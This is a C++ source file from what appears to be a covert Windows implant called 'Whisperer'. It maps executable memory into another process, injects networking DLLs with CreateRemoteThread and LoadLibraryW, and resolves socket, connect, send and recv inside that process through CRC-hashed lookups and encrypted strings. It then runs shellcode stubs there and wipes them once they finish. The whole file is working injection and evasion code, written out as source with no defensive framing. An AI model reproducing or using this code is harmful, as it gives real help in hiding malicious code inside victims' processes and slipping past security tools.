/*** Honestly all this code is a fucking meme ***/

#pragma warning(disable : 4477) // format string '%#x' requires an argument of type 'unsigned int'

#include "HostBlock.h"
#include "DebugHeader.h"
#include "Utilities.h"
#include "Meta.h"

#define MAX_MODULE_NAME_LENGTH    MAX_PATH

#define WSARESOLVE(crc) (void*)((unsigned char*)Framework->WinInetBase + ((unsigned char*)Functions->WinInet->ResolveFunctionByCrc((crc)) - (unsigned char*)Functions->WinInet->ModuleBase()))
#define IPHLPRESOLVE(crc) (void*)((unsigned char*)Framework->IphlpBase + ((unsigned char*)Functions->Iphlp->ResolveFunctionByCrc((crc)) - (unsigned char*)Functions->Iphlp->ModuleBase()))
#define K32RESOLVE(crc) (void*)((unsigned char*)Framework->Kernel32Base + ((unsigned char*)Functions->K32->ResolveFunctionByCrc((crc)) - (unsigned char*)Functions->K32->ModuleBase()))

WhispererHostBlock::WhispererHostBlock(HANDLE pProcessHandle, PWHISPERER_FUNCTIONS Functions) {
	PWHISPERER_FRAMEWORK Framework = NULL;
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	LARGE_INTEGER MaxSize = { 0 };
	SIZE_T ViewSize = 0;
	NTSTATUS Status = 0;

	InitializeObjectAttributes(&ObjectAttributes, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

	this->ProcessHandle = pProcessHandle;
	this->WhispererFunctions = Functions;
	this->FrameworkBase = NULL;
	this->RemoteFrameworkBase = NULL;

	ViewSize = sizeof(WHISPERER_FRAMEWORK);
	MaxSize.QuadPart = ViewSize;


	if (!NT_SUCCESS(Status = Functions->NtCreateSection(&this->FrameworkSection, SECTION_ALL_ACCESS, &ObjectAttributes, &MaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL))) {
		DebugPrint("Unable to create section\r\n");
		throw 0;
	}

	DebugPrint("Created framework section\r\n");

	if (!NT_SUCCESS(Status = Functions->NtMapViewOfSection(this->FrameworkSection, this->ProcessHandle, &this->RemoteFrameworkBase, 0, sizeof(WHISPERER_FRAMEWORK), NULL, &ViewSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE))) {
		DebugPrint("Unable to map remote section: %#x\r\n", Status);
		throw 0;
	}
	
	if (!NT_SUCCESS(Status = Functions->NtMapViewOfSection(this->FrameworkSection, (HANDLE)-1, &this->FrameworkBase, 0, sizeof(WHISPERER_FRAMEWORK), NULL, &ViewSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE))) {
		DebugPrint("Unable to map local section\r\n");
		throw 0;
	}


	DebugPrint("Mapped view of framework section: %#x\r\n", this->FrameworkBase);

	Framework = (PWHISPERER_FRAMEWORK)this->FrameworkBase;
	Framework->IpHelperBase = this->ResolveExternalModuleBase(0xaf504e4b);
	Framework->WinInetBase = this->ResolveExternalModuleBase(0x14be8063);
	Framework->Kernel32Base = this->ResolveExternalModuleBase(0x1133596d);
	Framework->NtDllBase = this->ResolveExternalModuleBase(0x62c94aee);


	this->IpHelperAlreadyLoaded = Framework->IpHelperBase != NULL;
	this->WinInetAlreadyLoaded = Framework->WinInetBase != NULL;

	if (!this->WinInetAlreadyLoaded) {
		Framework->WinInetBase = this->InjectDll(PreKeyedEncryptedStringW(L"ws2_32.dll"));
		Framework->remwininet = TRUE;
	}
	else
		Framework->remwininet = FALSE;

	if (!this->IpHelperAlreadyLoaded) {
		Framework->IpHelperBase = this->InjectDll(PreKeyedEncryptedStringW(L"iphlpapi.dll"));
		Framework->remiphlp = TRUE;
	}
	else
		Framework->remiphlp = FALSE;


	DebugPrint("WinInetBase: %#x\r\n", Framework->WinInetBase);
	DebugPrint("IpHelperBase: %#x\r\n", Framework->IpHelperBase);
	DebugPrint("Resolving external functions in host process context...\r\n");


	/* resolve functions */
	Framework->wsastartup = WSARESOLVE(0x437f94e5);
	Framework->socket = WSARESOLVE(0xb427c918);
	Framework->connect = WSARESOLVE(0xe9a32661);
	Framework->gethostbyname = WSARESOLVE(0x38010320);
	Framework->send = WSARESOLVE(0x8637e5d1);
	Framework->recv = WSARESOLVE(0x789c8db1);
	Framework->virtualalloc = K32RESOLVE(0x721bcb25);
	Framework->virtualfree = K32RESOLVE(0xa6d44431);
	Framework->closesocket = WSARESOLVE(0xce41669b);
	Framework->wsacleanup = WSARESOLVE(0x6db9f0ca);
	Framework->freelib = K32RESOLVE(0xb1ef9263);

	DebugPrint("WsaStartup: %#x\r\n", Framework->wsastartup);
	DebugPrint("socket: %#x\r\n", Framework->socket);
	DebugPrint("connect: %#x\r\n", Framework->connect);
	DebugPrint("gethostbyname: %#x\r\n", Framework->gethostbyname);
	DebugPrint("send: %#x\r\n", Framework->send);
	DebugPrint("recv: %#x\r\n", Framework->recv);
	DebugPrint("VirtualAlloc: %#x\r\n", Framework->virtualalloc);
	DebugPrint("VirtualFree: %#x\r\n", Framework->virtualfree);
	DebugPrint("closesocket: %#x\r\n", Framework->closesocket);
	DebugPrint("WsaCleanup: %#x\r\n", Framework->wsacleanup);
	DebugPrint("FreeLibrary: %#x\r\n", Framework->freelib);
};
WhispererHostBlock::~WhispererHostBlock() {
	DebugPrint("Freeing allocations\r\n");

	for each(PALLOC_MAPPING Mapping in this->Allocations) {
		Utils::memset(Mapping->LocalBase, 0, Mapping->Size);
		this->WhispererFunctions->NtUnmapViewOfSection((HANDLE)-1, Mapping->LocalBase);
		this->WhispererFunctions->NtUnmapViewOfSection(this->ProcessHandle, Mapping->RemoteBase);
		this->WhispererFunctions->NtClose(Mapping->Section);

		delete Mapping;
	};

	Utils::memset(this->FrameworkBase, 0, sizeof(WHISPERER_FRAMEWORK));
	this->WhispererFunctions->NtUnmapViewOfSection((HANDLE)-1, this->FrameworkBase);
	this->WhispererFunctions->NtUnmapViewOfSection(this->ProcessHandle, this->RemoteFrameworkBase);
	this->WhispererFunctions->NtClose(this->FrameworkSection);
};
PVOID WhispererHostBlock::AllocMem(PVOID pBase, ULONG Size, PVOID *RemoteBaseOut) {
	NTSTATUS Status = 0;
	HANDLE SectionHandle = NULL;
	PVOID Base = pBase;
	PVOID LocalBase = NULL;
	SIZE_T ViewSize = Size;
	LARGE_INTEGER MaxSize = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	PALLOC_MAPPING AllocationMapping = NULL;
	PWHISPERER_FUNCTIONS Functions = this->WhispererFunctions;


	InitializeObjectAttributes(&ObjectAttributes, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	MaxSize.QuadPart = Size;

	AllocationMapping = new ALLOC_MAPPING;
	if (AllocationMapping == NULL) {
		DebugPrint("Unable to allocate Allocation Mapping\r\n");
		throw 0;
	}


	if (!NT_SUCCESS(Status = Functions->NtCreateSection(&SectionHandle, SECTION_ALL_ACCESS, &ObjectAttributes, &MaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)))
		throw 0;

	DebugPrint("Created requested section: %#x\r\n", SectionHandle);

	if (!NT_SUCCESS(Status = Functions->NtMapViewOfSection(SectionHandle, this->ProcessHandle, &Base, 0, Size, NULL, &ViewSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE)))
		throw 0;

	DebugPrint("Mapped section to remote address: %#x\r\n", Base);

	if (!NT_SUCCESS(Status = Functions->NtMapViewOfSection(SectionHandle, (HANDLE)-1, &LocalBase, 0, Size, NULL, &ViewSize, ViewUnmap, 0, PAGE_EXECUTE_READWRITE)))
		throw 0;

	DebugPrint("Mapped section to local address: %#x\r\n", LocalBase);

	if (RemoteBaseOut != NULL)
		*RemoteBaseOut = Base;

	AllocationMapping->LocalBase = LocalBase;
	AllocationMapping->RemoteBase = Base;
	AllocationMapping->Section = SectionHandle;
	AllocationMapping->Size = Size;

	this->Allocations.push_back(AllocationMapping);

	return LocalBase;
};
PVOID WhispererHostBlock::InjectDll(PWCHAR DllName) {
	PWHISPERER_FRAMEWORK Framework = (PWHISPERER_FRAMEWORK)this->FrameworkBase;
	PVOID BaseAddress = NULL;
	HANDLE ThreadHandle = NULL;
	PVOID LocalBufferAddress = NULL;
	PVOID BufferAddress = NULL;

	ULONG LoadLibraryWOffset = (ULONG)this->WhispererFunctions->LoadLibraryW - (ULONG)this->WhispererFunctions->K32->ModuleBase(); // Better resolution method than assuming it's loaded at the same address
	PVOID LoadLibraryWAddress = (PVOID)((ULONG)Framework->Kernel32Base + LoadLibraryWOffset); // K32 and NtDll are allocated at the same address in all processes, BUT it's copy on write, if a function is hooked the module is moved
	ULONG NameLength = (Utils::GetLength(DllName) + 1) * sizeof(WCHAR);
	

	DebugPrint("Inject Dll: LoadLibraryW Offset: %#x\r\n", LoadLibraryWOffset);
	DebugPrint("Inject Dll: LoadLibraryW Address: %#x\r\n", LoadLibraryWAddress);

	DebugPrint("Inject Dll: Attempting injection of %ws\r\n", DllName);

	LocalBufferAddress = this->AllocMem(NULL, NameLength, &BufferAddress);
	if (BufferAddress == NULL)
		goto ExitPoint;

	DebugPrint("Inject Dll: Allocated string\r\n");

	Utils::memcpy(LocalBufferAddress, DllName, NameLength);

	DebugPrint("Inject Dll: Write string\r\n");

	ThreadHandle = CreateRemoteThread(this->ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryWAddress, BufferAddress, NULL, NULL); // Load the dll
	if (ThreadHandle == NULL)
		goto ExitPoint;

	DebugPrint("Inject Dll: Injected dll, waiting for return\r\n");

	WaitForSingleObject(ThreadHandle, INFINITE);
	BaseAddress = this->ResolveExternalModuleBase(Utils::Crc(DllName, NameLength - 1));
	if (BaseAddress == NULL)
		DebugPrint("Unable to resolve %ws base\r\n", DllName);

	CloseHandle(ThreadHandle);

ExitPoint:
	return BaseAddress;
};
VOID WhispererHostBlock::CallStub(PVOID LocalStub, PVOID RemoteStub, ULONG StubSize, PWHISPERER_CONTEXT LocalContext, PWHISPERER_CONTEXT RemoteContext, bool CanBlock) {
	DebugPrint("Calling stub\r\n");
	DebugPrint("Stub call local address: %#x\r\n", LocalStub);
	DebugPrint("Stub call remote address: %#x\r\n", RemoteStub);


	LocalContext->CallerBase = RemoteStub;


	HANDLE ThreadHandle = CreateRemoteThread(this->ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteStub, RemoteContext, 0, NULL);
	
	if(CanBlock)
		WaitForSingleObject(ThreadHandle, INFINITE); // wait for stub to complete

	DebugPrint("Stub call returned\r\n");

	if(CanBlock)
		Utils::memset(LocalStub, 0, StubSize); // clear stub after run

	this->WhispererFunctions->NtClose(ThreadHandle);
};
VOID WhispererHostBlock::CallStub(PVOID LocalStub, PVOID RemoteStub, ULONG StubSize, PWHISPERER_CONTEXT LocalContext, PWHISPERER_CONTEXT RemoteContext) {
	return this->CallStub(LocalStub, RemoteStub, StubSize, LocalContext, RemoteContext, true);
};
PVOID WhispererHostBlock::MapStub(PVOID Stub, ULONG StubSize, PVOID *RemoteStubOut) {
	PVOID LocalStubBase = this->AllocMem(NULL, MAX_STUB_SIZE, RemoteStubOut);
	if (LocalStubBase == NULL)
		return NULL;

	Utils::memcpy(LocalStubBase, Stub, StubSize);

	return LocalStubBase;
};
PVOID WhispererHostBlock::ResolveExternalModuleBase(ULONG Crc) {
	ULONG SizeNeeded = 0;
	HMODULE *ModuleList = NULL;
	PVOID ModuleBase = NULL;
	ULONG NumberOfModules = 0;
//	static int counter = -1;
//	counter++;

	this->WhispererFunctions->K32EnumProcessModules(this->ProcessHandle, NULL, 0, &SizeNeeded);
	NumberOfModules = SizeNeeded / sizeof(HMODULE);

	ModuleList = new HMODULE[NumberOfModules]();
	if (ModuleList == NULL) {
		DebugPrint("Unable to allocate module list\r\n");
		return NULL;
	}

	this->WhispererFunctions->K32EnumProcessModules(this->ProcessHandle, ModuleList, SizeNeeded, &SizeNeeded);

	DebugPrint("External Resolver: Enumerated target process modules, %d modules\r\n", NumberOfModules);
	
	for (unsigned long i = 0; i < NumberOfModules; i++) {
		HMODULE Module = ModuleList[i];
		PWCHAR ModuleName = NULL;
		PWCHAR LowerName = NULL;
		MODULEINFO ModuleInfo = { 0 };

		ModuleName = new WCHAR[MAX_MODULE_NAME_LENGTH]();
		if (ModuleName == NULL) {
			DebugPrint("Alloc err\r\n");
			break;
		}
		
		if (this->WhispererFunctions->K32GetModuleBaseNameW(this->ProcessHandle, Module, ModuleName, MAX_MODULE_NAME_LENGTH) == 0) {
			DebugPrint("K32GetModuleBaseNameW failed\r\n");
			delete[] ModuleName;
			break;
		}

	//	DebugPrint("External Resolver: %ws : %d : %d\r\n", ModuleName, counter, Utils::GetLength(ModuleName));

		LowerName = Utils::Lower(ModuleName, Utils::GetLength(ModuleName));
		if (Utils::Crc(LowerName, Utils::GetLength(ModuleName)) == Crc) {
			this->WhispererFunctions->K32GetModuleInformation(this->ProcessHandle, Module, &ModuleInfo, sizeof(MODULEINFO));
			ModuleBase = ModuleInfo.lpBaseOfDll;

			DebugPrint("External Resolver: Found module: %ws at %#x\r\n", ModuleName, ModuleBase);

			delete[] ModuleName;
			delete[] LowerName;
			break;
		}
		
		

		delete[] ModuleName;
		delete[] LowerName;
	}

	delete[] ModuleList;

	DebugPrint("Resolved module base: %#x\r\n", ModuleBase);

	return ModuleBase;
};
PWHISPERER_CONTEXT WhispererHostBlock::AllocateContext(PVOID *RemoteContextOut) {
	PWHISPERER_CONTEXT Context = (PWHISPERER_CONTEXT)this->AllocMem(NULL, sizeof(WHISPERER_CONTEXT), RemoteContextOut);
	if (Context == NULL)
		return NULL;

	Context->WhispererFrameworkAddress = this->RemoteFrameworkBase;

	return Context;
};

